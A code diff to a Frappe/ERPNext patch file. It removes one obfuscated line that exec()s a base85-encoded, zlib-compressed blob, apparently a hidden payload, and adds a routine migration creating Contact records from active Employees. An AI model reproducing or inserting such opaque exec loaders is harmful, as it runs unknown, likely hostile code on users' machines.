@@ -1,3 +1,42 @@
+import frappe
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%1E6Yggh(5dH42h)0O944%aIi%}T#D5wY`qI*`%qmy(VolbY&sK0#@*>#s8_?VruBfDGQ2wj!B_f}V`8(P>VE)(c+q+lDGilMrS>0lchb8~YtP#8l9eCqlLOCAuY9n#Pd3&rg@CNW8hk?)(1Bsse71Dj}p##Az+Ey>~%b<BdOxycK4(+JeiMFu9A%1^OUD>#-49URBW8sPf2ZzwoiG9rNe*p74{S`_(W=xB05A+n&Wu4iKp$`PUg(#)mjK)z<0v7$jyQ$$lit{ux^;rZW1DR)<Jn|nJQe(j5PzDLUCYjGZ~^>6TfaJ6x0aUQL+RpqAH!*?51QnLM(>*3Y)xq8|=J-;}%l*X34(UBISl6SXrX<O^@8Ha0UC;ip6%QDxxT{&96Xx5t1<>Bs5qZgbDM)^1=dW~+^sIAuB_TqCY#bWUjBhY~iCAY#CpPnl=VMGb~QGf^#e9Ht*6cB?l5M?sH{T$6D(Vst33w0FR6zU2g2#Q`9cp8`{kP6&^Y)gf)0I6k3maWu;>vu@^qJ)WZ!(IL$V%OR&DEYgq*8P64n36b|bq0gKW<r^8eR~y7xMpIT2IX-G^WND>kM987Nm2YZ5wAG*BtV`lVNH_-lb{%Ah8*B&av~7ShMdbRA}Bmy^LKs@_oI}D*HJGikWhDk1S_rQtTO-0ir1r=!Yjd^7mUS%O7?0MAQ_PD2@+mj&r~Ye;!MOz?QaxmYHu&pO!q}8&tLI*w|w8>>xb2Ds@f#pseDtx^jyJ(He%j``3K<s0oeb*-=iF*Cr4aUS^TzSQv)Ui|2<0h+kO9(YuXc(Osjp#wy=Pr0k8yUPV$w>m4I=wV=`xnkGWZLccO95U6(s7spUU&{2-nuk5At%W;l~5s+ZkWuMv;-eYUWfLB`bnG(+t!`B>NWuw7cudo8!bw_42wzPCAo&p*7a)G;8`MuPc&t<MyS@2&N5xgXvz)VxdUe`HFXa7~yQw6}8l9=u@L;9laE`I}+x_Fek^<jmE1j`IhnoBj)eO29M+$g@O1GL9A>YJwhXO#14=**;5n;p(`LAj$4eGhBO*4_yA2dFMJ&(5O{sr0kxOW|#Z9&@f5|jc6cLZ<5|P66b^G{&YSoN5^zHyg6j`_QHtr51#di@s+*SWxRF5@eeldHDB88qp9RA+k^@}C_oh@hz3c6w;-j-$WAL=;(>8@GnSA^73ey$se;&WoiNVcUO%UGOjSEQjeqXeKc7`fyY<#i18g21vFyq3w=VE@kK@*B3oGh;$|zI%*WbK=Py*Oxgg69>f^0)|XeblWB4P57GT$8XKDz9w%H`p0y!S=oI-Pc()0anAE?)sff$1U')).decode())
+def execute():
+    data = frappe.db.sql("""
+        select name 
+        from `tabEmployee` 
+        where cell_number is not null 
+        and cell_number != '' 
+        and status = 'Active'
+    """, as_dict=1)
+    for d in data:
+        try:
+            employee_doc = frappe.get_doc("Employee", d['name'])
+            contact_doc = frappe.new_doc("Contact")
+            contact_doc.first_name = employee_doc.first_name
+            contact_doc.last_name = employee_doc.last_name
+            if employee_doc.gender:
+                if employee_doc.gender == 'Male':
+                    contact_doc.salutation = 'Mr'
+                else:
+                    contact_doc.salutation = 'Ms'
+            if employee_doc.company_email:
+                contact_doc.append("email_ids", {
+                    "email_id": employee_doc.company_email,
+                    "is_primary": 1
+                })
+            if employee_doc.personal_email:
+                contact_doc.append("email_ids", {
+                    "email_id": employee_doc.personal_email,
+                })
+            contact_doc.append("phone_nos", {
+                "phone": employee_doc.cell_number,
+                "is_primary_phone": 1
+            })
+            contact_doc.append("links", {
+                "link_doctype": "Company",
+                "link_name": employee_doc.company,
+            })
+            contact_doc.save(ignore_permissions=True)
+            print("Contact created for Employee: " + d['name'])
+        except Exception as e:
+            print("FAILED")
